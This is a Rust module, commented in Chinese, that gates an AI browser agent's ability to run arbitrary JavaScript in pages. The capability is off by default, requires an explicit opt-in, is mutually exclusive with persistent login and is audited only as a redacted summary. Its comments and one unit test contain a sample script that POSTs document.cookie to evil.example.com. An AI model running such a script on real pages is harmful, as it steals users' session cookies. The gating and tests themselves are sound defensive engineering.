//! **E3：evaluate 门控**（默认 OFF + opt-in「全权模式」+ 与持久登录互斥 + 强审计脱敏）。
//!
//! DESIGN §16「evaluate」行 + P2 裁决⑨。evaluate（在页面上下文跑任意 JS）是引擎能力里**最高危**的
//! 逃生舱——一句 `document.cookie` / `fetch(evil, {body:secret})` 就能整体绕过 aria-snapshot 脱敏、
//! 出口防火墙、secret 域绑定等所有下游防线。故它是**默认最高门控**：
//!
//! 1. **默认 evaluate OFF**：`act(Evaluate{script})` 默认返 [`BrowserError::Unsupported`]
//!    `{capability:"evaluate", hint:<讲清为何 off + 怎么开>}`（[`evaluate_off_error`]）。这是
//!    default-deny：没有任何 session 默认能跑 evaluate。
//!
//! 2. **opt-in「全权模式」**（full-power / unrestricted mode）：用户**显式** opt-in 的配置开关
//!    （[`EvaluateGate::full_power`]，**LIVE 读**——参考 `nomifun-ai-agent::factory::nomi::read_bool_pref`
//!    的 `client_preferences` 范式；E3 是引擎层纯逻辑门，实际 LIVE 读接线在 services.rs / F 阶段，见
//!    [`EvaluateGate`] 的 `TODO(F1-wire-live-read)`）。仅当全权显式开启，evaluate 才放行。
//!
//! 3. **与持久登录互斥（关键安全）**：全权模式与「持久登录」(persistent login，P6 才落地，见
//!    DESIGN §27「持久登录默认策略（未决）」+ §16「持久登录前置」行明文「**禁 evaluate**」)
//!    **互斥**——两者同时开 → 返错（[`BrowserError::Blocked`]，讲清互斥原因）。持久登录会话灌着真实
//!    长期登录态，再放开任意 JS = 把长期凭据暴露给逃生舱；故持久登录开启时 evaluate **强制封死**
//!    （即便全权也被互斥拦下）。判定是纯函数 [`check_full_power_eligible`]。
//!
//! 4. **yolo 不豁免**：yolo / companion 会话**不**自动开 evaluate——evaluate 的放行**只看全权开关**，
//!    **绝不看 `SessionMode`**。这呼应裁决⑧的不变量⑧「红线不靠被旁路的 orchestration 闸」：yolo /
//!    companion 旁路的是 orchestration 审批闸（orchestration.rs:271 / lib.rs:100 / companion.rs:281），
//!    而 evaluate 走的是本模块这道**独立**门——它不读 session_mode，故 yolo 无从豁免。本模块的任何 API
//!    都**不**接受 session_mode 入参（类型层杜绝「被 yolo 旁路」）。
//!
//! 5. **强审计脱敏**：全权模式放行 evaluate 时记一条醒目 `tracing::warn` 审计日志——但 **script 可能
//!    含敏感内容**（`document.cookie` / token），审计**只记摘要**（[`script_audit_summary`]：字符长度 +
//!    **脱敏后**的短前缀），**绝不**记全文。前端醒目展示留 **P3**（DESIGN §16「前端醒目」+ 裁决⑨「前端
//!    醒目审计」+ plan 开放问题 1「全权模式前端 UI 展示是 P3」）。
//!
//! 不变量（勿破坏）：
//! - **默认 evaluate OFF**（[`EvaluateGate::default`] `full_power=false` → [`gate`] 返 `Unsupported`）。
//! - **evaluate 门不看 session_mode**（不变量⑧；本模块 API 无 session_mode 入参）。
//! - **全权与持久登录互斥**（[`check_full_power_eligible`] 两者皆 true → `Blocked`）。
//! - **持久登录下 evaluate 强制 OFF**（持久登录 true → 即便全权 true 也被互斥拦下 → 不放行）。
//! - **审计只记摘要不记全文**（[`script_audit_summary`] 单测断言不含明文）。

use crate::engine::BrowserError;

/// evaluate 门控配置（**独立**门，不读 session_mode；不变量⑧）。
///
/// `Default` = **evaluate OFF**（`full_power=false`）+ 无持久登录（`persistent_login=false`）。这是
/// default-deny：没有任何 session 默认能跑 evaluate（裁决⑨）。
///
/// **LIVE 读**（与 `read_bool_pref` 范式一致）：`full_power` 应在**每次** evaluate 入口处从
/// `client_preferences`（key 形如 `agent.browserUse.fullPower`，待 F1 定）读 LIVE 值灌进来，使用户在
/// System Settings 里切换全权开关**无需重启**即对新动作生效。E3 只做引擎层纯逻辑门 + 持有该配置；实际
/// 把 `client_preferences` LIVE 值灌进 [`EvaluateGate`] 的接线在 services.rs / F 阶段。
///
/// `persistent_login` 在 **P6** 才真正落地（DESIGN §27 持久登录默认策略未决 / §16 持久登录前置）。P2
/// 当前**无**持久登录配置来源，故默认 `false`（占位 bool）；互斥逻辑[`check_full_power_eligible`]已就位，
/// 待 P6 接真实持久登录开关时只需把其 LIVE 值灌进本字段，互斥即自动生效（无需改门逻辑）。
///
/// **SD-6 已接线**：`persistent_login` 现由 factory `read_bool_pref("agent.browserUse.persistentLogin",
/// true)` LIVE 读，经 `NomiResolvedConfig.browser_persistent_login` → `BrowserConfig.persistent_login`
/// → `BrowserTool.evaluate_persistent_login` → `EngineConfig.evaluate_persistent_login` → 本字段。
/// 产品默认 ON（host_default=true），代码级 Default 仍 false（default-deny 基线）。
//
// TODO(F1-wire-live-read): services.rs 在每次 act(Evaluate) 前从 client_preferences 读 `full_power`
// LIVE 值（read_bool_pref 范式），构造 EvaluateGate 灌进引擎/facade。E3 仅提供纯逻辑门 + Default OFF。
// SD-6: persistent_login LIVE 值已接线（factory read_bool_pref host_default=true → EngineConfig →
// from_launched → EvaluateGate.persistent_login）。产品默认 ON，互斥逻辑已激活。
#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub struct EvaluateGate {
    /// 用户显式 opt-in 的「全权模式」开关（LIVE 读）。`false`（默认）→ evaluate 封死。
    pub full_power: bool,
    /// 该会话是否开启「持久登录」（SD-6 已接线，LIVE 值由 factory `read_bool_pref` 灌入，产品默认 ON）。
    /// `true` → 与全权互斥，evaluate 强制封死。
    pub persistent_login: bool,
}

/// **[纯逻辑] 全权模式资格判定**（E3 核心门 + 与持久登录互斥；裁决⑨）。
///
/// 四象限（**不读 session_mode**——不变量⑧）：
/// | full_power | persistent_login | 结果 |
/// |---|---|---|
/// | `false` | `false` | `Err(Unsupported{capability:"evaluate"})`（默认 OFF）|
/// | `false` | `true`  | `Err(Unsupported{capability:"evaluate"})`（持久登录下亦 OFF；全权没开自然封死）|
/// | `true`  | `false` | `Ok(())`（**唯一放行**：用户显式 opt-in 全权 + 无持久登录）|
/// | `true`  | `true`  | `Err(Blocked)`（**互斥**：全权与持久登录不可同开——持久登录灌着真实长期凭据，
/// |         |         | 放开任意 JS 会把它暴露给逃生舱；故持久登录开启时 evaluate 强制封死）|
///
/// 互斥优先级：**先判互斥**（两者皆 true → `Blocked`，讲清互斥原因），再判全权未开（→ `Unsupported`）。
/// 这样持久登录 + 全权同开时返回的是「互斥」的明确 `Blocked`，而非笼统「feature off」——让上层/用户
/// 看清是**配置冲突**（关掉其一）而非「忘了开」。
pub fn check_full_power_eligible(
    full_power: bool,
    persistent_login: bool,
) -> Result<(), BrowserError> {
    // 先判互斥：全权 + 持久登录同开 → Blocked（明确配置冲突，非「feature off」）。持久登录下 evaluate
    // 强制封死——即便全权也被这里拦下（不变量「持久登录下 evaluate 强制 OFF」）。
    if full_power && persistent_login {
        return Err(BrowserError::Blocked {
            reason: "evaluate is mutually exclusive with persistent login: full-power mode \
                     cannot be enabled while this session has persistent login on (persistent \
                     login holds long-lived credentials that arbitrary JS could exfiltrate). \
                     Disable persistent login for this session to use full-power evaluate, or \
                     keep persistent login and leave evaluate off."
                .into(),
        });
    }
    // 全权未显式开启 → 默认 OFF（default-deny）。
    if !full_power {
        return Err(evaluate_off_error());
    }
    // 全权开 + 无持久登录 → 唯一放行。
    Ok(())
}

/// **[纯逻辑] 标准「evaluate 默认 OFF」错误**（[`BrowserError::Unsupported`]，`capability=="evaluate"`）。
///
/// hint 讲清**为何 off**（最高危逃生舱，绕过所有下游脱敏/防火墙/secret 防线）+ **怎么开**（用户在
/// System Settings 显式 opt-in「全权模式」，且该会话不能同时开持久登录）。锚 `engine.rs` 的
/// `browser_error_unsupported_carries_hint` 范式（capability=="evaluate" + hint 非空）。
pub fn evaluate_off_error() -> BrowserError {
    BrowserError::Unsupported {
        capability: "evaluate".into(),
        hint: "evaluate (run arbitrary JS in the page) is disabled by default — it is the \
               highest-risk escape hatch and would bypass credential redaction, the egress \
               firewall, and secret origin-binding. To use it, the user must explicitly opt in \
               to full-power mode in System Settings; full-power mode cannot be combined with \
               persistent login. Prefer the structured actions (click/type/extract/observe) \
               instead."
            .into(),
    }
}

/// **[纯逻辑] act(Evaluate) 的总门**（E3 入口纯逻辑；**不读 session_mode**——不变量⑧）。
///
/// 据 [`EvaluateGate`] 判 evaluate 是否放行：委托 [`check_full_power_eligible`]（全权资格 + 互斥）。
/// `Ok(())` = 放行（调用方随后记审计 [`audit_evaluate`] 并真执行）；`Err(_)` = 封死（默认 `Unsupported` /
/// 互斥 `Blocked`）。**注意**：本函数签名**刻意不含** `session_mode`——evaluate 门只看全权开关，yolo /
/// companion 无从豁免（不变量⑧）。
pub fn gate(cfg: &EvaluateGate) -> Result<(), BrowserError> {
    check_full_power_eligible(cfg.full_power, cfg.persistent_login)
}

/// 审计摘要里脱敏前缀的最大字符数（短前缀即可定位「跑的大致是什么」，长了徒增泄漏面）。
const AUDIT_PREVIEW_CHARS: usize = 64;

/// **[纯逻辑] 构造 evaluate 的审计摘要**（强审计脱敏；裁决⑨「强审计」+ 不变量「只记摘要不记全文」）。
///
/// script 可能含敏感内容（`document.cookie` / token / 拼进字面量的密码），审计**绝不**记全文。本函数返
/// 一条**安全可记**的摘要：`len=<字符数> preview="<脱敏后的短前缀>"`——
/// - **长度**：字符数（`chars().count()`，供诊断「跑了多长的脚本」）。
/// - **脱敏短前缀**：取前 [`AUDIT_PREVIEW_CHARS`] 字符 → 再跑 [`crate::redact::redact_yaml`]（已知凭据
///   模式 + 高熵 token 兜底替 `[REDACTED_SECRET]`），故即便前缀里恰好含 token / 密钥也被抹掉。
///   前缀按 char 边界截断（不裂多字节），并把内部换行折成空格（单行日志）。
///
/// 安全保证（单测守卫）：含 `document.cookie`+长高熵串的 script，其摘要里**不含**该明文高熵串。
pub fn script_audit_summary(script: &str) -> String {
    let len = script.chars().count();
    // 取前 AUDIT_PREVIEW_CHARS 字符（按 char 边界，不裂多字节），换行折空格（单行）。
    let prefix: String = script
        .chars()
        .take(AUDIT_PREVIEW_CHARS)
        .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
        .collect();
    // 即便短前缀里含凭据 / 高熵 token 也被脱敏（[REDACTED_SECRET]）——前缀本身仍可能含 secret 片段，
    // 故必须过 redact_yaml（不只截断）。
    let redacted = crate::redact::redact_yaml(&prefix);
    let ellipsis = if len > AUDIT_PREVIEW_CHARS { "…" } else { "" };
    format!("len={len} preview={redacted:?}{ellipsis}")
}

/// **记一条 evaluate 放行的醒目审计日志**（强审计；裁决⑨）。**只记摘要不记全文**（[`script_audit_summary`]
/// 已脱敏）。`tracing::warn`（醒目级别——全权 evaluate 是高危放行，值得在日志里显眼）。前端醒目展示留 P3。
///
/// `origin`：当前页 origin（provenance，best-effort，可能 `None`）。审计记 origin 让事后能定位「在哪个
/// 站点上跑了任意 JS」。**绝不**记 script 全文（哪怕 origin 可信）。
pub fn audit_evaluate(script: &str, origin: Option<&str>) {
    tracing::warn!(
        target: "nomi_browser_engine::evaluate",
        origin = origin.unwrap_or("<unknown>"),
        script = %script_audit_summary(script),
        "FULL-POWER evaluate allowed: running arbitrary JS in the page (highest-risk escape \
         hatch; bypasses redaction/firewall/secret-binding). Script logged as redacted summary \
         only — never full text. Frontend prominent surfacing: P3."
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── 默认 evaluate OFF（裁决⑨）：full_power=false → Unsupported{capability:"evaluate"} + hint 非空。
    // 锚 engine.rs `browser_error_unsupported_carries_hint` 范式。 ──────────────────────────────

    #[test]
    fn default_gate_is_evaluate_off() {
        // EvaluateGate::default() = 全权 off + 无持久登录 → gate 封死（Unsupported,evaluate,hint 非空）。
        let cfg = EvaluateGate::default();
        assert!(!cfg.full_power, "default must be full_power OFF (default-deny)");
        assert!(!cfg.persistent_login, "default has no persistent login");
        match gate(&cfg) {
            Err(BrowserError::Unsupported { capability, hint }) => {
                assert_eq!(capability, "evaluate", "default-off must report evaluate capability");
                assert!(!hint.is_empty(), "off hint must explain why/how (锚 engine.rs:146 范式)");
                // hint 须讲清「怎么开」（提到 full-power / opt-in），引导用户而非死胡同。
                let lc = hint.to_lowercase();
                assert!(
                    lc.contains("full-power") || lc.contains("opt in") || lc.contains("opt-in"),
                    "off hint must explain how to enable (full-power opt-in), got: {hint}"
                );
            }
            other => panic!("default gate must be Unsupported{{evaluate}}, got {other:?}"),
        }
    }

    #[test]
    fn evaluate_off_error_is_unsupported_evaluate_with_hint() {
        // 独立验 evaluate_off_error 本体（gate 的 default-off 复用它）。
        match evaluate_off_error() {
            BrowserError::Unsupported { capability, hint } => {
                assert_eq!(capability, "evaluate");
                assert!(!hint.is_empty());
                // Display 也含 capability（engine.rs 的 #[error("unsupported capability {capability}: {hint}")]）。
                let e = evaluate_off_error();
                assert!(format!("{e}").contains("evaluate"));
            }
            other => panic!("expected Unsupported{{evaluate}}, got {other:?}"),
        }
    }

    // ── check_full_power_eligible 四象限（裁决⑨核心 + 互斥）──────────────────────────────────

    #[test]
    fn full_power_off_evaluate_stays_off() {
        // 全权 off（持久登录 off）→ evaluate 仍 OFF（Unsupported{evaluate}）。
        match check_full_power_eligible(false, false) {
            Err(BrowserError::Unsupported { capability, .. }) => {
                assert_eq!(capability, "evaluate");
            }
            other => panic!("full_power off must be Unsupported{{evaluate}}, got {other:?}"),
        }
    }

    #[test]
    fn full_power_on_no_persistent_login_is_allowed() {
        // 全权 on + 持久登录 off → **唯一放行**。
        assert!(
            check_full_power_eligible(true, false).is_ok(),
            "full-power on + no persistent login is the one allowed quadrant"
        );
    }

    #[test]
    fn full_power_on_with_persistent_login_is_mutually_exclusive_error() {
        // 全权 on + 持久登录 on → **互斥 Err**（Blocked，讲清互斥原因；持久登录下 evaluate 强制封死）。
        match check_full_power_eligible(true, true) {
            Err(BrowserError::Blocked { reason }) => {
                let lc = reason.to_lowercase();
                assert!(
                    lc.contains("mutually exclusive") || lc.contains("persistent login"),
                    "mutual-exclusion error must explain the conflict, got: {reason}"
                );
            }
            other => panic!("full-power + persistent login must be Blocked (互斥), got {other:?}"),
        }
    }

    #[test]
    fn full_power_off_with_persistent_login_is_off() {
        // 全权 off + 持久登录 on → evaluate OFF（Unsupported；全权没开自然封死，持久登录只是另一原因）。
        match check_full_power_eligible(false, true) {
            Err(BrowserError::Unsupported { capability, .. }) => {
                assert_eq!(capability, "evaluate");
            }
            other => panic!("full_power off (even with persistent login) must be Unsupported, got {other:?}"),
        }
    }

    #[test]
    fn persistent_login_forces_evaluate_off_regardless_of_full_power() {
        // 不变量「持久登录下 evaluate 强制 OFF」：persistent_login=true 时，**无论全权开关**，gate 都不放行。
        // full_power=false → Unsupported；full_power=true → Blocked（互斥）。两者都 != Ok。
        let pl_off_fp = EvaluateGate { full_power: false, persistent_login: true };
        let pl_on_fp = EvaluateGate { full_power: true, persistent_login: true };
        assert!(gate(&pl_off_fp).is_err(), "persistent login + full_power off → not allowed");
        assert!(gate(&pl_on_fp).is_err(), "persistent login + full_power on → not allowed (互斥)");
    }

    // ── yolo 不豁免（不变量⑧）：evaluate 门不看 session_mode。──────────────────────────────────

    #[test]
    fn gate_signature_does_not_take_session_mode() {
        // **类型层守卫**：gate / check_full_power_eligible 的签名只有 EvaluateGate / 两个 bool——
        // **无** session_mode 入参。故 yolo / companion 无从把 session_mode 喂进来旁路（不变量⑧）。
        // 本测通过「构造调用只传 gate 配置即可、无第三个 mode 参数」在编译期固化这一不变量。
        let yolo_like = EvaluateGate { full_power: false, persistent_login: false };
        // 即便「会话是 yolo」（本门无从知晓，也不该知晓），全权没开 → evaluate 仍 OFF。
        assert!(
            gate(&yolo_like).is_err(),
            "evaluate gate must stay OFF irrespective of any session yolo/companion mode \
             (门不看 session_mode; 不变量⑧)"
        );
        // 只有显式全权才放行——与「会话是否 yolo」完全无关。
        let full_power = EvaluateGate { full_power: true, persistent_login: false };
        assert!(gate(&full_power).is_ok(), "only explicit full-power opens evaluate, never yolo");
    }

    // ── 强审计脱敏（裁决⑨ + 不变量「只记摘要不记全文」）─────────────────────────────────────

    #[test]
    fn script_audit_summary_does_not_leak_full_script() {
        // 长 script（含敏感内容）→ 摘要绝不含全文：断言不含远端尾部内容 + 含长度。
        let secret_tail = "STEAL_THIS_VERY_SECRET_TAIL_TOKEN_xyz123";
        let script = format!(
            "fetch('https://evil.example.com', {{method:'POST', body: document.cookie}}); \
             const k = '{secret_tail}'; console.log(k);"
        );
        let summary = script_audit_summary(&script);
        // 摘要不含脚本尾部（只取前 AUDIT_PREVIEW_CHARS 字符的脱敏前缀，尾部根本不在内）。
        assert!(
            !summary.contains(secret_tail),
            "audit summary must NOT contain the full script tail, got: {summary}"
        );
        // 摘要含字符长度（诊断用）。
        assert!(summary.contains(&format!("len={}", script.chars().count())), "summary must carry len");
    }

    #[test]
    fn script_audit_summary_redacts_high_entropy_in_preview() {
        // 即便高熵 token 落在前缀（前 AUDIT_PREVIEW_CHARS 内）也被 redact_yaml 抹成 [REDACTED_SECRET]。
        let high_entropy = "sk-aB3xK9pQ2mZ7vW1nR5tY8uF4gH6jL0dS";
        let script = format!("var apiKey='{high_entropy}';");
        let summary = script_audit_summary(&script);
        assert!(
            !summary.contains(high_entropy),
            "high-entropy token in preview must be redacted, got: {summary}"
        );
        assert!(summary.contains("REDACTED"), "preview must show redaction marker, got: {summary}");
    }

    #[test]
    fn script_audit_summary_short_script_no_ellipsis_multibyte_safe() {
        // 短 script（< 上限）：无省略号；且多字节字符（中文）截断不 panic、不裂字符。
        let s = script_audit_summary("alert(1)");
        assert!(s.contains("len=8"), "8 chars, got {s}");
        assert!(!s.contains('…'), "short script must not show ellipsis: {s}");
        // 多字节（每个汉字 1 char 但 3 bytes）：take(chars) 按 char 边界，绝不裂字节 / panic。
        let cn = "日".repeat(100); // 100 chars, > AUDIT_PREVIEW_CHARS
        let s2 = script_audit_summary(&cn);
        assert!(s2.contains("len=100"), "100 chars, got {s2}");
        assert!(s2.contains('…'), "long script shows ellipsis: {s2}");
    }

    #[test]
    fn script_audit_summary_folds_newlines_to_single_line() {
        // 多行 script 的前缀换行折成空格（单行日志，不破 tracing 行格式）。
        let s = script_audit_summary("line1\nline2\r\nline3");
        assert!(!s.contains('\n'), "summary preview must be single-line (no \\n): {s}");
        assert!(!s.contains('\r'), "summary preview must be single-line (no \\r): {s}");
    }

    #[test]
    fn evaluate_gate_is_copy_debug_eq() {
        // EvaluateGate 是 Copy/Debug/Eq（配置类型基本性质，便于 services.rs 灌值 / 测试比较）。
        let a = EvaluateGate { full_power: true, persistent_login: false };
        let b = a; // Copy
        assert_eq!(a, b);
        let _ = format!("{a:?}");
    }
}
